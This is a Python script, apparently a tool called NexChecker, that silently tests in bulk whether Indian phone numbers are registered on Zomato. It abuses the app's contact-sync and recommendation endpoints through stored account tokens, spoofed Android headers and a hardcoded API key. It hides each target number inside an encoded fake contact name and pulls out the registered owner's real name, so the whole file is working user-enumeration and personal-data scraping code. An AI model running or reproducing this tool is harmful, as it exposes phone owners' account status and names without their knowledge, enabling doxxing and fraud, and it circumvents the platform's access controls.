#!/usr/bin/env python3
"""
NexChecker — Zomato silent registration checker (no OTP sent to target).

Methods:
  1. Primary: Local or remote NexZomato HTTP checker endpoint (default: http://127.0.0.1:3000/api/checker/phone).
  2. Fallback: Direct Zomato contact-sync engine using local stored credentials.

Outputs standard unified status:
  - REGISTERED: Target phone is registered on Zomato
  - NOT_REGISTERED: Target phone is not registered / fresh
  - ERROR / UNKNOWN: Failed to determine status
"""

from __future__ import annotations

import glob
import json
import os
import sys
import time
from pathlib import Path
from typing import Any, Dict, List, Optional

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

import requests

# ------------------------------------------------------------
# Config & Endpoints
# ------------------------------------------------------------
CHECKERS_DIR = Path(__file__).resolve().parent
PROJECT_ROOT = CHECKERS_DIR.parent

ZOMATO_CHECKER_URL = os.getenv(
    "ZOMATO_CHECKER_URL", "http://127.0.0.1:3000/api/checker/phone"
)

# Detect accounts directory in priority order:
# 1. ZOMATO_ACCOUNTS_DIR environment variable
# 2. In-repo directory: PROJECT_ROOT / "zomato_accounts"
# 3. In-repo data directory: PROJECT_ROOT / "data" / "zomato_accounts"
# 4. Sibling repo: PROJECT_ROOT.parent / "NexZomato" / "server" / "data" / "accounts"
def get_accounts_dir() -> Optional[Path]:
    env_dir = os.getenv("ZOMATO_ACCOUNTS_DIR")
    if env_dir and Path(env_dir).is_dir():
        return Path(env_dir)
    candidates = [
        PROJECT_ROOT / "zomato_accounts",
        PROJECT_ROOT / "data" / "zomato_accounts",
        PROJECT_ROOT.parent / "NexZomato" / "server" / "data" / "accounts",
    ]
    for c in candidates:
        if c.is_dir():
            return c
    return None

ZOMATO_API_BASE = "https://api.zomato.com"
SYNC_ENDPOINT = f"{ZOMATO_API_BASE}/gw/user-preference/recommendation/sync-contacts"
GET_ENDPOINT = f"{ZOMATO_API_BASE}/gw/user-preference/recommendation/get-contacts"

TIMEOUT = 12
BULK_DELAY = 0.4

DIGIT_TO_LETTER = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J"]
LETTER_TO_DIGIT = {
    "A": "0", "B": "1", "C": "2", "D": "3", "E": "4",
    "F": "5", "G": "6", "H": "7", "I": "8", "J": "9",
}


# ------------------------------------------------------------
# Helpers
# ------------------------------------------------------------
def normalize_mobile(mobile: str) -> str:
    """Extract clean 10-digit Indian mobile number."""
    digits = "".join(c for c in str(mobile) if c.isdigit())
    if digits.startswith("91") and len(digits) == 12:
        digits = digits[2:]
    elif len(digits) > 10:
        digits = digits[-10:]
    return digits


def encode_phone_to_name(clean10: str) -> str:
    """Encode digits to alphabetic string to comply with Zomato naming rules."""
    code = "".join(DIGIT_TO_LETTER[int(d)] for d in clean10)
    return f"NexUser {code}"


def decode_name_to_phone(name: str) -> Optional[str]:
    """Decode alphabetic contact name back to 10-digit phone."""
    import re
    match = re.search(r"NexUser\s+([A-J]{10})", name or "", re.IGNORECASE)
    if not match:
        return None
    return "".join(LETTER_TO_DIGIT[c] for c in match.group(1).upper())


def pretty_print(result: dict) -> None:
    status = result.get("status", "UNKNOWN")
    mobile = result.get("mobile", "")
    recs = result.get("recommendations", 0)
    name = result.get("name", "")
    if status == "REGISTERED":
        print("❰ [OK] REGISTERED ❱")
        print("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print(f"✓ Status   : REGISTERED")
        print(f"🎯 Platform : Zomato 🍽")
        print(f"📱 Number   : {mobile}")
        if name:
            print(f"👤 Name     : {name}")
        if recs:
            print(f"📊 Recs     : {recs}")
        print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
        print("Active Zomato account detected.")
    elif status == "NOT_REGISTERED":
        print("❰ [X] NOT REGISTERED ❱")
        print("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print(f"✗ Status   : NOT_REGISTERED")
        print(f"🎯 Platform : Zomato 🍽")
        print(f"📱 Number   : {mobile}")
        print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
        print("No active Zomato account on this number.")
    else:
        print(f"Result: {result}")


# ------------------------------------------------------------
# ------------------------------------------------------------
# Fallback Direct Account Resolver (Auto-Refreshing)
# ------------------------------------------------------------
ZOMATO_API_KEY = "7749b19667964b87a3efc739e254ada2"
ZOMATO_AUTH_CLIENT_ID = "5276d7f1-910b-4243-92ea-d27e758ad02b"
ZOMATO_APP_CLIENT_ID = "zomato_android_v2"
REFRESH_URL = "https://accounts.zomato.com/token/refresh"


def _load_accounts(limit: int = 5) -> List[Dict[str, Any]]:
    """Find valid Zomato accounts with access or refresh tokens."""
    acc_dir = get_accounts_dir()
    if not acc_dir or not acc_dir.is_dir():
        return []

    results: List[Dict[str, Any]] = []
    json_files = list(acc_dir.glob("*.json"))
    for f in sorted(json_files, key=lambda x: x.stat().st_mtime, reverse=True):
        try:
            with open(f, encoding="utf-8") as fp:
                data = json.load(fp)
                if data.get("refreshToken") or data.get("accessToken"):
                    data["_file_path"] = str(f)
                    results.append(data)
                    if len(results) >= limit:
                        break
        except Exception:
            continue
    return results


def _refresh_token(account: Dict[str, Any]) -> Optional[str]:
    """Request a fresh access token from Zomato OAuth server using refresh token."""
    refresh_token = account.get("refreshToken")
    if not refresh_token:
        return None

    dev = account.get("device", {})
    headers = {
        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {dev.get('osVersion', '14')}; {dev.get('model', 'SM-M546B')} Build/{dev.get('buildId', 'TP1A.220624.014')})",
        "Accept": "application/json",
        "Accept-Language": "en-IN",
        "X-Zomato-API-Key": ZOMATO_API_KEY,
        "X-Zomato-Client-Id": ZOMATO_AUTH_CLIENT_ID,
        "X-Client-Id": ZOMATO_AUTH_CLIENT_ID,
        "X-Zomato-UUID": dev.get("deviceId", "bcde3e5c-0652-4343-ac11-9f8896e86633"),
        "X-Android-Id": dev.get("androidId", "bcde3e5c06525343"),
        "X-Zomato-App-Version": dev.get("appVersion", "19.9.4"),
        "x-zomato-app": "consumer",
        "Origin": "https://accounts.zomato.com",
        "X-Zomato-Refresh-Token": refresh_token,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    if account.get("accessToken"):
        headers["Authorization"] = f"Bearer {account['accessToken']}"
        headers["X-Zomato-Access-Token"] = account["accessToken"]

    try:
        resp = requests.post(
            REFRESH_URL,
            headers=headers,
            data={"scope": "offline openid", "rurl": "https://api.zomato.com"},
            timeout=TIMEOUT,
        )
        if resp.status_code == 200:
            res_json = resp.json()
            new_token = res_json.get("token", {}).get("access_token") or res_json.get("access_token")
            if new_token:
                account["accessToken"] = new_token
                file_path = account.get("_file_path")
                if file_path:
                    try:
                        clean_data = {k: v for k, v in account.items() if k != "_file_path"}
                        with open(file_path, "w", encoding="utf-8") as fp:
                            json.dump(clean_data, fp, indent=2)
                    except Exception:
                        pass
                return new_token
    except Exception:
        pass
    return None


def _build_api_headers(account: Dict[str, Any], token: str) -> Dict[str, str]:
    """Build authentic Zomato Android app headers."""
    import uuid
    dev = account.get("device", {})
    return {
        "User-Agent": f"Zomato/{dev.get('appVersion', '19.9.4')} (Linux; U; Android {dev.get('osVersion', '14')}; {dev.get('model', 'SM-M546B')} Build/{dev.get('buildId', 'TP1A.220624.014')})",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-IN,en;q=0.9,hi-IN;q=0.8,hi;q=0.7",
        "X-Zomato-API-Key": ZOMATO_API_KEY,
        "X-Zomato-Client-Id": ZOMATO_AUTH_CLIENT_ID,
        "X-Client-Id": ZOMATO_APP_CLIENT_ID,
        "X-Zomato-UUID": dev.get("deviceId", "bcde3e5c-0652-4343-ac11-9f8896e86633"),
        "X-Android-Id": dev.get("androidId", "bcde3e5c06525343"),
        "X-App-Session-Id": dev.get("sessionId", str(uuid.uuid4())),
        "X-Zomato-App-Version": str(dev.get("appVersionCode", "1994")),
        "X-Zomato-App-Version-Code": str(dev.get("appVersionCode", "1994")),
        "X-App-Language": "en",
        "X-Device-Language": "en-IN",
        "X-APP-APPEARANCE": "DARK",
        "X-APP-THEME": "default",
        "X-SYSTEM-APPEARANCE": "DARK",
        "X-City-Id": "4",
        "X-O2-City-Id": "4",
        "X-Present-Lat": "12.9716",
        "X-Present-Long": "77.5946",
        "X-Request-Id": str(uuid.uuid4()),
        "X-Request-Tracking-Id": str(uuid.uuid4()),
        "Authorization": f"Bearer {token}",
        "X-Zomato-Access-Token": token,
        "X-Access-Token": token,
    }


def _check_account_sync(m10: str, account: Dict[str, Any]) -> dict:
    """Execute live contact-sync check using an account with auto-refresh."""
    encoded_name = encode_phone_to_name(m10)
    token = account.get("accessToken")

    # 1. Ensure token exists
    if not token:
        token = _refresh_token(account)
    if not token:
        return {"status": "AUTH_ERROR"}

    # 2. Sync contact
    sync_payload = {
        "flow_type": "revamped_flow",
        "contacts_access_level": "full_access",
        "contacts": [
            {
                "phone_numbers": [f"+91{m10}", m10],
                "name": encoded_name,
                "id": "1",
            }
        ],
    }

    headers = _build_api_headers(account, token)
    try:
        s_resp = requests.post(SYNC_ENDPOINT, headers=headers, json=sync_payload, timeout=TIMEOUT)
        if s_resp.status_code in (400, 401, 403):
            refreshed = _refresh_token(account)
            if refreshed:
                token = refreshed
                headers = _build_api_headers(account, token)
                requests.post(SYNC_ENDPOINT, headers=headers, json=sync_payload, timeout=TIMEOUT)
    except Exception:
        pass

    # 3. Query contact recommendations
    get_payload = {
        "request_type": "initial",
        "additional_filters": {},
        "page_type": "contacts_management",
        "removed_snippet_ids": [],
        "page_index": "1",
        "count": 100,
        "is_gold_mode_on": False,
        "keyword": "",
        "load_more": True,
    }

    try:
        r = requests.post(GET_ENDPOINT, headers=headers, json=get_payload, timeout=TIMEOUT)
        if r.status_code in (400, 401, 403):
            refreshed = _refresh_token(account)
            if refreshed:
                token = refreshed
                headers = _build_api_headers(account, token)
                r = requests.post(GET_ENDPOINT, headers=headers, json=get_payload, timeout=TIMEOUT)

        if r.status_code != 200:
            return {"status": "AUTH_ERROR", "code": r.status_code}
        try:
            data = r.json()
        except Exception:
            return {"status": "AUTH_ERROR", "code": 502, "detail": "Non-JSON response"}
    except Exception as exc:
        return {"status": "ERROR", "mobile": m10, "error": str(exc)}

    snippets = data.get("results") or []
    for snippet in snippets:
        acc_items = snippet.get("accordion_snippet_type_15", {}).get("items") or []
        for acc in acc_items:
            checkbox_items = acc.get("checkbox_snippet_type_6", {}).get("items") or []
            for item in checkbox_items:
                contact_name = item.get("title", {}).get("text", "")
                subtitle = (item.get("subtitle", {}).get("text") or "").strip()
                matched = (
                    decode_name_to_phone(contact_name) == m10
                    or contact_name == encoded_name
                    or m10 in contact_name
                )
                if matched:
                    if "not on zomato" in subtitle.lower():
                        return {
                            "status": "NOT_REGISTERED",
                            "registered": False,
                            "fresh": True,
                            "mobile": m10,
                            "platform": "zomato",
                            "subtitle": subtitle,
                        }
                    # Registered user
                    owner_name = None
                    try:
                        deeplink = item.get("click_action", {}).get("deeplink", {}).get("url", "")
                        if "friend_recommendation_params=" in deeplink:
                            import urllib.parse
                            raw_p = urllib.parse.unquote(deeplink.split("friend_recommendation_params=")[1])
                            p_json = json.loads(raw_p)
                            if p_json.get("owner_user_name") and not p_json["owner_user_name"].startswith("NexUser"):
                                owner_name = p_json["owner_user_name"]
                    except Exception:
                        pass

                    rec_count = 0
                    try:
                        import re
                        m = re.search(r"(\d+)\s+recommendation", subtitle, re.I)
                        if m:
                            rec_count = int(m.group(1))
                    except Exception:
                        pass

                    return {
                        "status": "REGISTERED",
                        "registered": True,
                        "fresh": False,
                        "mobile": m10,
                        "platform": "zomato",
                        "subtitle": subtitle,
                        "name": owner_name or "Zomato User",
                        "recommendations": rec_count,
                    }

    return {
        "status": "NOT_REGISTERED",
        "registered": False,
        "fresh": True,
        "mobile": m10,
        "platform": "zomato",
        "note": "Not found in Zomato registered contacts list",
    }


# ------------------------------------------------------------
# Core Check Function
# ------------------------------------------------------------
def check_zomato(mobile: str) -> dict:
    """Check if an Indian mobile number is registered on Zomato.

    Returns:
      {
        "status": "REGISTERED" | "NOT_REGISTERED" | "ERROR",
        "mobile": "9876543210",
        "registered": bool,
        ...
      }
    """
    m10 = normalize_mobile(mobile)
    if len(m10) != 10 or m10[0] not in "6789":
        return {
            "status": "ERROR",
            "mobile": mobile,
            "error": "Invalid 10-digit Indian mobile",
        }

    # Method 1: Local or remote NexZomato HTTP checker service
    try:
        resp = requests.post(
            ZOMATO_CHECKER_URL,
            json={"target_phone": m10},
            timeout=TIMEOUT,
        )
        if resp.status_code == 200:
            data = resp.json()
            is_reg = bool(data.get("registered") or data.get("isZomatoUser"))
            return {
                "status": "REGISTERED" if is_reg else "NOT_REGISTERED",
                "registered": is_reg,
                "fresh": not is_reg,
                "mobile": m10,
                "platform": "zomato",
                "recommendations": data.get("recommendations", 0),
                "name": data.get("name", ""),
                "subtitle": data.get("subtitle", ""),
                "raw": data,
            }
    except Exception:
        # Microservice unavailable, attempt fallback
        pass

    # Method 2: Direct contact sync via stored accounts with auto-refresh
    accounts = _load_accounts(limit=5)
    for account in accounts:
        try:
            res = _check_account_sync(m10, account)
            if res.get("status") == "AUTH_ERROR":
                continue
            return res
        except Exception:
            continue

    return {
        "status": "ERROR",
        "mobile": m10,
        "platform": "zomato",
        "error": "Zomato checker service offline and no valid account token found",
    }


# ------------------------------------------------------------
# CLI Runner
# ------------------------------------------------------------
def main() -> None:
    if len(sys.argv) < 2:
        print("Usage: python zomato_check.py <10-digit> [more numbers...]")
        print("       python zomato_check.py numbers.txt")
        sys.exit(1)

    args = sys.argv[1:]
    numbers: List[str] = []

    if len(args) == 1 and args[0].endswith(".txt"):
        with open(args[0], encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    numbers.append(line)
    else:
        numbers = args

    total = len(numbers)
    for i, num in enumerate(numbers, 1):
        m10 = normalize_mobile(num)
        print(f"[{i}/{total}] {m10} ... ", end="", flush=True)
        res = check_zomato(m10)
        print(res.get("status", "UNKNOWN"))
        pretty_print(res)
        if i < total:
            time.sleep(BULK_DELAY)


if __name__ == "__main__":
    main()
